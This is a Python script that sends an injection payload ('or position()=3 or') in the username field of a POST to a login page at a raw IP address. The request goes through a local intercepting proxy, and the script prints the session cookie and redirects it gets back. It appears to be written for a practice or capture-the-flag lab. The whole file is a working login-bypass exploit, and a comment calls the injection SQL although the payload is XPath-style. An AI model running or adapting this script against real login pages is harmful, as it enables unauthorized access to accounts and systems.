import requests
import urllib

# Target URL
url = 'http://94.237.62.166:48715/login.php'

# Headers to mimic the original request
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.237.62.166:48715',
    'Connection': 'keep-alive',
    'Referer': 'http://94.237.62.166:48715/index.php?msg=Login%20failed!',
    'Cookie': 'PHPSESSID=r4uj4moftksc49rbg93lbmloi0',
    'Priority': 'u=0, i'
}

proxies = {
    'http': 'http://127.0.0.1:8080',  # Replace with your proxy's address
    'https': 'http://127.0.0.1:8080',  # Replace with your proxy's address
}

# Data payload to be sent in the POST request
data = {
    'username': "' or position()=3 or '",  # SQL injection attempt
    'pass': ''  # Empty password field
}

encoded_data = urllib.parse.urlencode(data)

# Send the POST request
response = requests.post(url, headers=headers, data=data, proxies=proxies)

if response.status_code == 302:
    php_sessid = response.cookies.get('PHPSESSID')
    print(f'New PHPSESSID: {php_sessid}')

    # Use the new PHPSESSID in subsequent requests
    subsequent_url = 'http://94.237.62.166:48715/user.php'  # Example URL for next request
    cookies = {'PHPSESSID': php_sessid}

if response.history:
    print("The request was redirected:")
    for resp in response.history:
        print(f"Redirected from {resp.url} with status code {resp.status_code}")
else:
    print("No redirects occurred.")

# Print the response content
print("Status Code:", response.status_code)
print("Response Text:", response.text)
print("Final URL after redirects:", response.url)
